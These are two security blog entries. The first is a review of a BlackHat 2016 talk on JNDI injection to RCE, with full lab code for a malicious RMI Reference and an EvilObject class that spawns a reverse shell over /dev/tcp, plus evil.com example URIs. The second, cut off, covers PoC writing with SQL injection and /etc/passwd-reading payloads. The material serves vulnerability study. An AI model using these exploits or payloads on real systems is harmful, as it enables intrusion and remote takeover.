    <content type="html"><![CDATA[<p>（两个多月没产出了，感觉最近身体被掏空~）</p><p>BlackHat 2016 (USA) 刚结束不久，作为 Web🐶 的我立马去过了一遍与 Web 相关的议题。Web 相关的议题也不算太多，比较精华的就是 <a href="https://twitter.com/pwntester" target="_blank" rel="noopener">@pentester</a> 大牛的议题 - <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">“A Journey From JNDI LDAP Manipulation To RCE”</a>，其介绍了 Java 中利用 JNDI 进行 RCE 的具体思路和案例，早在今年 1 月时就已经爆出过 Spring 框架的一个 RCE，该漏洞原理最根本就是利用了 JNDI 的注入，反序列化只起到一个触发 JNDI 注入的作用。</p><p>本文在学习议题 PPT 的基础上，结合自己的一些理解，按理论基础了解到具体利用实现的一个过程进行回顾。（也是一名不会 Java 的 Web🐶 尝试理解漏洞原理和 EXP 构造的一个记录过程，<strong>文章内容如有不当还望指出</strong>）</p><h3 id="0x00-JNDI-是什么？"><a href="#0x00-JNDI-是什么？" class="headerlink" title="0x00 - JNDI 是什么？"></a>0x00 - JNDI 是什么？</h3><p>JNDI - Java Naming and Directory Interface 名为 Java命名和目录接口，具体的概念还是比较复杂难懂，具体结构设计细节可以不用了解，简单来说就是 JNDI 提供了一组通用的接口可供应用很方便地去访问不同的后端服务，例如 LDAP、RMI、CORBA 等。如下图：</p><p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/1.png" alt=""></p><p>在 Java 中为了能够更方便的管理、访问和调用远程的资源对象，常常会使用 LDAP 和 RMI 等服务来将资源对象或方法绑定在固定的远程服务端，供应用程序来进行访问和调用。为了更好的理解整个 JNDI 注入产生的原因，下面用实际代码来说明一下常规 RMI 访问和使用 JNDI 访问 RMI 的区别。（更多 JNDI 的概念可参考 <a href="http://baike.baidu.com/view/209575.htm" target="_blank" rel="noopener">http://baike.baidu.com/view/209575.htm</a>）</p><h4 id="1-JNDI-获取并调用远程方法"><a href="#1-JNDI-获取并调用远程方法" class="headerlink" title="1. JNDI 获取并调用远程方法"></a>1. JNDI 获取并调用远程方法</h4><p>首先一个对象方法要想被远程应用所调用需要其 extends 于 <code>java.rmi.Remote</code> 接口，并需要抛出 <code>RemoteException</code> 异常，而远程对象必须实现 <code>java.rmi.server.UniCastRemoteObject</code> 类。首先创建一个 <code>IHello</code> 的接口（<code>IHello.java</code>）：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IHello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再创建 <code>IHelloImpl</code> 类实现 <code>java.rmi.server.UniCastRemoteObject</code> 类并包含 <code>IHello</code> 接口（<code>IHelloImpl.java</code>）：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IHelloImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IHello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">IHelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello "</span> + name + <span class="string">" ^_^ "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后用 RMI 绑定实例对象方法，并使用 JNDI 去获取并调用对象方法（<code>CallService.java</code>）：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CallService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 配置 JNDI 默认设置</span></span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">                <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,</span><br><span class="line">                <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 本地开启 1099 端口作为 RMI 服务，并以标识 "hello" 绑定方法对象</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        IHello hello = <span class="keyword">new</span> IHelloImpl();</span><br><span class="line">        registry.bind(<span class="string">"hello"</span>, hello);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// JNDI 获取 RMI 上的方法对象并进行调用</span></span><br><span class="line">        IHello rHello = (IHello) ctx.lookup(<span class="string">"hello"</span>);</span><br><span class="line">        System.out.println(rHello.sayHello(<span class="string">"RickGray"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将上面 3 个文件放在同一目录，并使用 <code>javac *.java</code> 进行编译，然后运行 <code>java CallService</code> 即可得到运行结果。</p><p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/2.png" alt=""></p><p>使用更为直观的图示来描述整个流程：</p><p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/3.png" alt=""></p><p>这里应用使用 JNDI 获取远程 <code>sayHello()</code> 函数并传入 <code>&quot;RickGray&quot;</code> 参数进行调用时，真正执行该函数是在远程服务端，执行完成后会将结果序列化返回给应用端，这一点是需要弄清楚的。</p><h4 id="2-RMI-中动态加载字节代码"><a href="#2-RMI-中动态加载字节代码" class="headerlink" title="2. RMI 中动态加载字节代码"></a>2. RMI 中动态加载字节代码</h4><p>如果远程获取 RMI 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。</p><p>Reference 中几个比较关键的属性：</p><ol><li>className - 远程加载时所使用的类名</li><li>classFactory - 加载的 class 中需要实例化类的名称</li><li>classFactoryLocation - 提供 classes 数据的地址可以是 file/ftp/http 等协议</li></ol><p>例如这里定义一个 Reference 实例，并使用继承了 <code>UnicastRemoteObject</code> 类的 <code>ReferenceWrapper</code> 包裹一下实例对象，使其能够通过 RMI 进行远程访问：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"refClassName"</span>, <span class="string">"insClassName"</span>, <span class="string">"http://example.com:12345/"</span>);</span><br><span class="line">ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br></pre></td></tr></table></figure><p>当有客户端通过 <code>lookup(&quot;refObj&quot;)</code> 获取远程对象时，获得到一个 Reference 类的存根，由于获取的是一个 Reference 实例，客户端会首先去本地的 <code>CLASSPATH</code> 去寻找被标识为 <code>refClassName</code> 的类，如果本地未找到，则会去请求 <code>http://example.com:12345/refClassName.class</code> 动态加载 classes 并调用 <code>insClassName</code> 的构造函数。</p><p>借用官方的流程图：</p><p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/4.png" alt=""></p><p>这里说明了在获取 RMI 远程对象时，可以动态地加载外部代码进行对象类型实例化，而 JNDI 同样具有访问 RMI 运城对象的能力，只要其查找参数即 <code>lookup()</code> 函数的参数值可控，那么就有可能促使程序去加载和自信部署在攻击者服务器上的恶意代码。</p><h3 id="0x02-JNDI-协议动态转换"><a href="#0x02-JNDI-协议动态转换" class="headerlink" title="0x02 JNDI 协议动态转换"></a>0x02 JNDI 协议动态转换</h3><p>前面简单的用代码和图例说明了 JNDI 的应用方式和 RMI 中的动态字节代码加载，在初始化配置 JNDI 设置时可以预先指定其上下文环境（RMI、LDAP 或者 CORBA 等）：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">        <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">env.put(Context.PROVIDER_URL,</span><br><span class="line">        <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br></pre></td></tr></table></figure><p>而在调用 <code>lookup()</code> 或者 <code>search()</code> 时，可以使用带 URI 动态的转换上下文环境，例如上面已经设置了当前上下文会访问 RMI 服务，那么可以直接使用 LDAP 的 URI 格式去转换上下文环境访问 LDAP 服务上的绑定对象：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ctx.lookup(<span class="string">"ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com"</span>);</span><br></pre></td></tr></table></figure><p>在议题所提供的 Write-Up 里有提供详细远离的代码来说明为什么可以使用绝对路径 URI 去动态地转换上下文环境：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getURLOrDefaultInitCtx()</code> 函数的具体代码实现为：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Context <span class="title">getURLOrDefaultInitCtx</span><span class="params">(Name paramName)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;</span><br><span class="line">        <span class="keyword">return</span> getDefaultInitCtx(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (paramName.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        String str1 = paramName.get(<span class="number">0</span>);</span><br><span class="line">        String str2 = getURLScheme(str1);  <span class="comment">// 尝试解析 URI 中的协议</span></span><br><span class="line">        <span class="keyword">if</span> (str2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果存在 Schema 协议，则尝试获取其对应的上下文环境</span></span><br><span class="line">            Context localContext = NamingManager.getURLContext(str2, <span class="keyword">this</span>.myProps);</span><br><span class="line">            <span class="keyword">if</span> (localContext != <span class="keyword">null</span>) &#123; </span><br><span class="line">                <span class="keyword">return</span> localContext;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但第一次调用 <code>lookup()</code> 函数的时候，会对上下文环境进行一个初始化，这时候代码会对 <code>paramName</code> 参数值进行一个 URL 解析，如果 <code>paramName</code> 包含一个特定的 Schema 协议，代码则会使用相应的工厂去初始化上下文环境，这时候不管之前配置的工厂环境是什么，这里都会被动态地对其进行替换。</p><h3 id="0x03-利用-JNDI-注入加载远程代码并执行"><a href="#0x03-利用-JNDI-注入加载远程代码并执行" class="headerlink" title="0x03 利用 JNDI 注入加载远程代码并执行"></a>0x03 利用 JNDI 注入加载远程代码并执行</h3><p>结合前面说到的两个点：</p><ul><li>JNDI 调用中 <code>lookup()</code> 参数可控</li><li>使用带协议的 URI 可以进行动态环境转换</li><li><code>Reference</code> 类动态代码获取进行实例化</li></ul><p>即当 Java 应用代码中出现 <code>lookup(&lt;attacker-controlled&gt;)</code> 这种情况时，会形成 RCE，整个利用过程为：</p><p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/5.png" alt=""></p><ol><li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 <code>rmi://evil.com:1099/refObj</code>；</li><li>原先配置好的上下文环境 <code>rmi://localhost:1099</code> 会因为动态环境转换而被指向 <code>rmi://evil.com:1099/</code>；</li><li>应用去 <code>rmi://evil.com:1099</code> 请求绑定对象 <code>refObj</code>，攻击者事先准备好的 RMI 服务会返回与名称 <code>refObj</code> 想绑定的 ReferenceWrapper 对象（<code>Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)</code>）；</li><li>应用获取到 <code>ReferenceWrapper</code> 对象开始从本地 <code>CLASSPATH</code> 中搜索 <code>EvilObject</code> 类，如果不存在则会从 <code>http://evil-cb.com/</code> 上去尝试获取 <code>EvilObject.class</code>，即动态的去获取 <code>http://evil-cb.com/EvilObject.class</code>；</li><li>攻击者事先准备好的服务返回编译好的包含恶意代码的 <code>EvilObject.class</code>；</li><li>应用开始调用 <code>EvilObject</code> 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；</li></ol><p>整个攻击的实现过程如上面所述，<strong>关键的利用点在于攻击者可控的允、许动态环境转换的接口函数</strong>，这里举了 <code>RMI</code> 结合 <code>Reference Object</code> 进行 RCE 的例子，更多的攻击向量参考原议题内容即可（因为我也理解得不是特别透彻，怕写错误导了大家）</p><p>下面给出完整的演示代码示例，首先是存在 JNDI 注入的程序（<code>RMIService.java</code>）：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args.length &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Usage: java JNDIClient &lt;uri&gt;"</span>);</span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String uri = args[<span class="number">0</span>];</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        System.out.println(<span class="string">"Using lookup() to fetch object with "</span> + uri);</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着是要通过 JNDI 注入远程加载的类实例，一会儿可以用 <code>python -m SimpleHTTPServer</code> 启一个临时的 HTTP 服务来提供编译好的 <code>EvilObject.class</code>（<code>EvilObject.java</code>）：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime rt = Runtime.getRuntime();</span><br><span class="line">        String[] commands = &#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"/bin/sh -i &gt; /dev/tcp/127.0.0.1/1337 2&gt;&amp;1 0&gt;&amp;1"</span>&#125;;</span><br><span class="line">        Process pc = rt.exec(commands);</span><br><span class="line">        pc.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>EvilObject</code> 类的构造函数中包含了执行系统命令反弹 Shell 的代码，一会儿当 JNDI 注入成功触发时会被执行。</p><p>这里还需要一个 RMI 服务绑定一个相关的引用类（<code>RMIService.java</code>）：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilObject"</span>, <span class="string">"EvilObject"</span>, <span class="string">"http://127.0.0.1:8080/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面也说到了对象实例要能成功绑定在 RMI 服务上，必须直接或间接的实现 <code>Remote</code> 接口，这里 <code>ReferenceWrapper</code> 就继承于 <code>UnicastRemoteObject</code> 类并实现了 <code>Remote</code> 接口。</p><p>这里将 <code>RMIService.java</code> 和 <code>JNDIClient.java</code> 放在同一目录下，将 <code>EvilObject.java</code> 放在另一个目录下（为防止漏洞复现过程中应用端实例化 EvilObject 对象时从 CLASSPATH 当前路径找到编译好的字节代码，而不去远端进行下载的情况发生）,编译这三个文件，并在不同窗口下执行命令：</p><p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/6.png" alt=""></p><p>成功执行后会在事先监听的端口上获取到反弹的 Shell。这里的代码只是为了方便还原漏洞场景，其他比较细节的东西这里就不讨论了。看不懂的可以多理解下前面那幅漏洞利用过程图例，这样结合代码能够更快速的掌握漏洞原理和关键点。</p><h3 id="0x04-简单总结"><a href="#0x04-简单总结" class="headerlink" title="0x04 简单总结"></a>0x04 简单总结</h3><p>由于 Java 知识能力有限，原议题中所涉及到的一些细节可能剖析得不太准确。文中只是简单地把 JNDI 注入的形成原理和如何利用 JNDI 注入进行 RCE 进行了一个说明，具体的攻击方式也只是谈到了用 RMI Reference 进行远程代码执行，原议题内容中还介绍了一些其它的攻击向量能够达到远程代码执行的效果，例如反序列化触发 JNDI 注入、使用 Remote Locations 进行代码执行和一些安全机制的绕过等等。</p><p>像今年 1 月份有关 Spring 框架反序列化导致远程代码执行的这个漏洞最根本原理就是利用了 JNDI 注入，有关详情可以参考 <a href="https://www.iswin.org/" target="_blank" rel="noopener">@随风</a> 师傅的文章 - <a href="https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">《Spring framework deserialization RCE漏洞分析以及利用》</a>，更多关于该议题的内容还是翻阅下原 Paper 比较好。</p><p>（世上漏洞如海，我愿略知一二）</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></li><li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></li><li><a href="http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection" target="_blank" rel="noopener">http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection</a></li><li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/codebase.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/codebase.html</a></li><li><a href="https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-分析以及利用" target="_blank" rel="noopener">https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-分析以及利用</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;（两个多月没产出了，感觉最近身体被掏空~）&lt;/p&gt;
&lt;p&gt;BlackHat 2016 (USA) 刚结束不久，作为 Web🐶 的我立马去过了一遍与 Web 相关的议题。Web 相关的议题也不算太多，比较精华的就是 &lt;a href=&quot;https://twitter.com/
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="web" scheme="http://rickgray.me/tags/web/"/>
    
      <category term="java" scheme="http://rickgray.me/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>漏洞检测的那些事儿 - 从理论到实战</title>
    <link href="http://rickgray.me/2016/06/01/how-to-scan-and-check-vulnerabilities/"/>
    <id>http://rickgray.me/2016/06/01/how-to-scan-and-check-vulnerabilities/</id>
    <published>2016-05-31T16:00:00.000Z</published>
    <updated>2018-04-24T15:48:57.518Z</updated>
    
    <content type="html"><![CDATA[<p>好像很久没发文了，近日心血来潮准备谈谈 “漏洞检测的那些事儿”。现在有一个现象就是一旦有危害较高的漏洞的验证 PoC 或者利用 EXP 被公布出来，就会有一大群饥渴难忍的帽子们去刷洞，对于一个路人甲的我来说，看得有点眼红。XD</p><p>刷洞归刷洞，蛋还是要扯的。漏洞从披露到研究员分析验证，再到 PoC 编写，进而到大规模扫描检测，在这环环相扣的漏洞应急生命周期中，我认为最关键的部分应该算是 <strong>PoC编写</strong> 和 <strong>漏洞检测</strong> 这两个部分了：</p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/1.png" alt=""></p><ul><li><strong>PoC编写</strong> - 复现漏洞环境，将漏洞复现流程代码化的过程</li><li><strong>漏洞检测</strong> - 使用编写好的 PoC 去验证测试目标是否存在着漏洞，需要注意的是在这个过程（或者说是在编写 PoC 的时候）需要做到安全、有效和无害，尽可能或者避免扫描过程对目标主机产生不可恢复的影响</li></ul><p>首先来说说 <strong>PoC 编写</strong>。编写 PoC 在我看来是安全研究员或者漏洞分析者日常最基础的工作，编写者把漏洞验证分析的过程通过代码描述下来，根据不同类型的漏洞编写相应的 PoC。根据常年编写 PoC 积累下来的经验，个人认为在编写 PoC 时应遵循几个准侧，如下：</p><ul><li><strong>随机性</strong></li><li><strong>确定性</strong></li><li><strong>通用型</strong></li></ul><p>可能你会觉得我太学术了？那么我就一点一点地把他们讲清楚。</p><h3 id="PoC-编写准则-amp-示例"><a href="#PoC-编写准则-amp-示例" class="headerlink" title="PoC 编写准则 &amp; 示例"></a>PoC 编写准则 &amp; 示例</h3><h4 id="i-随机性"><a href="#i-随机性" class="headerlink" title="i. 随机性"></a>i. 随机性</h4><p>PoC 中所涉及的关键变量或数据应该具有随机性，切勿使用固定的变量值生成 Payload，能够随机生成的尽量随机生成（如：上传文件的文件名，webshell 密码，Alert 的字符串，MD5 值），下面来看几个例子（我可真没打广告，例子大都使用的 <code>pocsuite</code> PoC 框架）：</p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/2.png" alt=""></p><p>上图所示的代码是 WordPress 中某个主题导致的任意文件上传漏洞的验证代码关键部分，可以看到上面使用了 <code>kstest.php</code> 作为每一次测试使用的上传文件名，很明显这里是用的固定的文件名，<strong>违背</strong>了上面所提到的随机性准侧。这里再多啰嗦一句，我并没有说在 PoC 中使用固定的变量或者数据有什么不对，而是觉得将能够随机的数据随机化能够降低在扫描检测的过程所承担的一些风险（具体有什么风险请自行脑补了）。</p><p>根据随机性准侧可修改代码如下：</p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/3.png" alt=""></p><p>更改后上传文件的文件名每次都为随机生成的 6 位字符，个人认为在一定程度上降低了扫描检测交互数据被追踪的可能性。</p><h4 id="ii-确定性"><a href="#ii-确定性" class="headerlink" title="ii. 确定性"></a>ii. 确定性</h4><p>PoC 中能通过测试返回的内容找到唯一确定的标识来说明该漏洞是否存在，并且这个标识需要有针对性，切勿使用过于模糊的条件去判断（如：HTTP 请求返回状态，固定的页面可控内容）。同样的，下面通过实例来说明一下：</p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/4.png" alt=""></p><p>上图所示的代码是某 Web 应用一个 <code>UNION</code> 型 SQL 注入的漏洞验证代码，代码中直接通过拼接 <code>-1&#39; union select  1,md5(1) --</code> 来进行注入，因该漏洞有数据回显，所以如果测试注入成功页面上会打印出 md5(1) 的值 <code>c4ca4238a0b923820dcc509a6f75849b</code>，显然的这个 PoC 看起来并没有什么问题，但是结合准则第一条随机性，我觉得这里应该使用 <code>md5(rand_num)</code> 作为标识确定更好，因为随机化后，准确率更高：</p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/5.png" alt=""></p><p>这里也不是坑你们，万一某个站点不存在漏洞，但页面中就是有个 <code>c4ca4238a0b923820dcc509a6f75849b</code>，你们觉得呢？</p><p>讲到这里，再说说一个 Python <code>requests</code> 库使用者可能会忽视的一个问题。有时候，我们在获取到一个请求返回对象时，会像如下代码那样做一个前置判断：</p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/6.png" alt=""></p><p>可能有人会说了，Python 中条件判断非空即为真，但是这里真的是这么处理的么？并不是，经过实战遇到的坑和后来测试发现，<code>Response</code> 对象的条件判断是通过 HTTP 返回状态码来进行判断的，当状态码范围在 <code>[400, 600]</code> 之间时，条件判断会返回 <code>False</code>。（不信的自己测试咯）</p><p>我为什么要提一下这个点呢，那是因为有时候我们测试漏洞或者将 Payload 打过去时，目标可能会因为后端处理逻辑出错而返回 <code>500</code>，但是这个时候其实页面中已经有漏洞存在的标识出现，如果这之前你用刚才说的方法提前对 <code>Response</code> 对象进行了一个条件判断，那么这一次就会导致漏报。So，你们知道该怎么做了吧？</p><h4 id="iii-通用性"><a href="#iii-通用性" class="headerlink" title="iii. 通用性"></a>iii. 通用性</h4><p>PoC 中所使用的 Payload 或包含的检测代码应兼顾各个环境或平台，能够构造出通用的 Payload 就不要使用单一目标的检测代码，切勿只考虑漏洞复现的环境（如：文件包含中路径形式，命令执行中执行的命令）。下图是 WordPress 中某个插件导致的任意文件下载漏洞：</p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/7.png" alt=""></p><p>上面验证代码逻辑简单的说就是，通过任意文件下载漏洞去读取 <code>/etc/passwd</code> 文件的内容，并判断返回的文件内容是否包含关键的字符串或者标识。明显的，这个 Payload 只适用于 *nix 环境的情况，在 Windows 平台上并不适用。更好的做法应该是根据漏洞应用的环境找到一个必然能够体现漏洞存在的标识，这里，我们可以取 WordPress 配置文件 <code>wp-config.php</code> 来进行判断（当然，下图最终的判断方式可能不怎么严谨）：</p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/8.png" alt=""></p><p>这么一改，Payload 就同时兼顾了多个平台环境，变成通用的了。</p><p>大大小小漏洞的 PoC 编写经验让我总结出这三点准则，你要是觉得是在扯蛋就不用往下看了。QWQ</p><h3 id="漏洞检测方法-amp-示例"><a href="#漏洞检测方法-amp-示例" class="headerlink" title="漏洞检测方法 &amp; 示例"></a>漏洞检测方法 &amp; 示例</h3><p>“漏洞检测！漏洞检测？漏洞检测。。。”，说了这么多，到底如何去归纳漏洞检测的方法呢？在我看来，根据 Web 漏洞的类型特点和表现形式，可以分为两大类：<strong>直接判断</strong> 和 <strong>间接判断</strong>。</p><ul><li><strong>直接判断</strong>：通过发送带有 Payload 的请求，能够从返回的内容中直接匹配相应状态进行判断</li><li><strong>间接判断</strong>：无法通过返回的内容直接判断，需借助其他工具间接的反应漏洞触发与否</li></ul><p>多说无益，还是直接上例子来体现一下吧（下列所示 Payloads 不完全通用）。</p><h4 id="1-直接判断"><a href="#1-直接判断" class="headerlink" title="1. 直接判断"></a>1. 直接判断</h4><h5 id="i-SQLi（回显）"><a href="#i-SQLi（回显）" class="headerlink" title="i. SQLi（回显）"></a>i. SQLi（回显）</h5><p>对于有回显的 SQL 注入，检测方法比较固定，这里遵循 “随机性” 和 “确定性” 两点即可。</p><p><strong>Error Based SQL Injection</strong></p><figure class="highlight 